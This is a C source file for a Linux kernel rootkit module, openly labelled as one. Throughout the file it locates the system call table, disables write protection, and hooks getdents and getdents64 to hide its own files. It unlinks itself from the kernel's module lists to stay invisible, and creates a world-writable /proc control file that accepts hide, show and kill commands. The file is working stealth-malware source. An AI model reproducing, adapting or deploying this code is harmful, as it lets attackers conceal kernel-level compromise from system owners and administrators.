#include "ninartk.h"

static const struct file_operations rootkit_fops = {
		.owner = THIS_MODULE,
		.read = rtkit_read,
		.write = rtkit_write,
};

asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
{
    return original_write(i,u,s);
}

/*
 * Overriding getdents64 function
 * Arguments :
 * fd = file descriptor, reffering the directory
 * dirp = buffer for linux_dirent structure
 * count = size of the buffer
 */
 asmlinkage long custom_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
         unsigned int tmp, i;
         struct linux_dirent64 __user *new_dir;

         tmp = (*original_getdents64)(fd, dirp, count);
         i = 0;
         new_dir = dirp;
         while (i < tmp) {
                 int reclen, len;
                 char* next_rec;
                 char* remaining_dirents;
                 if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
                         reclen = new_dir->d_reclen;
                         next_rec = (char *)new_dir + reclen;
                         len = (int *)dirp + tmp - (int *)next_rec;
                         remaining_dirents = kmalloc(len, GFP_KERNEL);
                         if(copy_from_user(remaining_dirents, next_rec, len))
                             continue;
                         if(copy_to_user(new_dir, remaining_dirents, len))
                             continue;
                         kfree(remaining_dirents);
                         tmp -= reclen;
                         continue;
                 }
                 i += new_dir->d_reclen;
                 new_dir = (struct linux_dirent64*)((char *)dirp + i);
         }
         return tmp;
 }

 asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
         unsigned int tmp, i;
         struct linux_dirent __user *new_dir;

         tmp = (*original_getdents)(fd, dirp, count);
         i = 0;
         new_dir = dirp;
         while (i < tmp) {
                 int reclen, len;
                 char* next_rec;
                 char* remaining_dirents;
                 if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
                         reclen = new_dir->d_reclen;
                         next_rec = (char *)new_dir + reclen;
                         len = (int *)dirp + tmp - (int *)next_rec;
                         remaining_dirents = kmalloc(len, GFP_KERNEL);
                         if(copy_from_user(remaining_dirents, next_rec, len))
                             continue;
                         if(copy_to_user(new_dir, remaining_dirents, len))
                             continue;
                         kfree(remaining_dirents);
                         tmp -= reclen;
                         continue;
                 }
                 i += new_dir->d_reclen;
                 new_dir = (struct linux_dirent*)((char *)dirp + i);
         }
         return tmp;
 }

void module_hide(void)
{
		/* The module is already hidden, do nothing. */
		if(module_hidden) return;

		module_previous = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
		list_del(&THIS_MODULE->mkobj.kobj.entry);
		module_hidden = !module_hidden;
}

void module_show(void)
{
		/* The module is not hidden yet, nothing more to show. */
		if(!module_hidden) return;

		list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
		list_add(&THIS_MODULE->list, module_previous);
		module_hidden = !module_hidden;
}

static ssize_t rtkit_read(struct file *file, char __user *buffer,
													size_t count, loff_t *ppos)
{
		if(count > temp)
				count = temp;
		temp -= count;

		if(!copy_to_user(buffer, desc, count))
        return -1;

		if(count == 0) {
				sprintf(desc, "test\n");
				temp = strlen(desc);
		}

		return count;
}

static ssize_t rtkit_write(struct file *file, const char __user *buffer,
													 size_t count, loff_t *ppos)
{
		if(!strncmp(buffer, HIDE_MOD_CMD, strlen(HIDE_MOD_CMD))) {
				module_hide();
		} else if(!strncmp(buffer, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) {
				module_show();
		} else if(!strncmp(buffer, HIDE_PID_CMD, strlen(HIDE_PID_CMD))) {
				new_systable();
		} else if(!strncmp(buffer, SHOW_PID_CMD, strlen(SHOW_PID_CMD))) {
				old_systable();
		} else if(!strncmp(buffer, KILL_NINA_PID, strlen(KILL_NINA_PID))) {
				old_systable();
				struct task_struct *p;
				for_each_process(p) {
						if(strncmp(p->comm, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
							printk(KERN_INFO "killing %s\n", p->comm);
							//do_send_sig_info(SIGQUIT, SEND_SIG_PRIV, p, false);
						}
				}
				new_systable();
		}
		return count;
}

static unsigned long **get_syscall_table(void)
{
    	unsigned long int offset = PAGE_OFFSET;
    	unsigned long **syscall_t;

    	while(offset < ULLONG_MAX){
        		syscall_t = (unsigned long **)offset;

        		if(syscall_t[__NR_close] == (unsigned long *) sys_close) {
                        return syscall_t;
                }
        		offset += sizeof(void *);
    	}
    	return NULL;
}

/* Initialize proc file system */
static int procfs_init(void)
{
		proc_rtkit = proc_create(MODULE_NAME, 0666, NULL, &rootkit_fops);
		if(proc_rtkit == NULL)
				return 0;
		proc_root = proc_rtkit->parent;
		if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
				return 0;

		sprintf(desc, "test\n");
		temp = strlen(desc);

		return 1;
}

static void procfs_clean(void)
{
		if(proc_rtkit != NULL) {
				remove_proc_entry(MODULE_NAME, NULL);
				proc_rtkit = NULL;
		}
}

static void new_systable(void)
{
		/* Making sys_call_table read/write */
		GPF_DISABLE();
		syscall_table[__NR_getdents64] = (long)custom_getdents64;
		syscall_table[__NR_getdents] = (long)custom_getdents;
		syscall_table[__NR_write] = (long)custom_write;
		/* sys_call_table back to read-only */
		GPF_ENABLE();
}

static void old_systable(void)
{
		/* Making sys_call_table read/write */
		GPF_DISABLE();
		syscall_table[__NR_write] = (long)original_write;
		syscall_table[__NR_getdents] = (long)original_getdents;
		syscall_table[__NR_getdents64] = (long)original_getdents64;
		/* sys_call_table back to read-only */
		GPF_ENABLE();
}

/* Init function, called when the module is loaded */
static int __init rootkit_init(void)
{
		if(!procfs_init()) {
				procfs_clean();
				return -1;
		}
        if(!(syscall_table = (unsigned long *)get_syscall_table()))
                return -1;

        original_getdents64 = (void*)syscall_table[__NR_getdents64];
        original_getdents = (void*)syscall_table[__NR_getdents];
        original_write = (void*)syscall_table[__NR_write];
        new_systable();
		return 0;
}

/* Exit function, called when the module is unloaded */
static void __exit rootkit_exit(void)
{
		module_show();
		procfs_clean();
		module_hide();
        old_systable();
		printk(KERN_INFO "Closing rootkit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
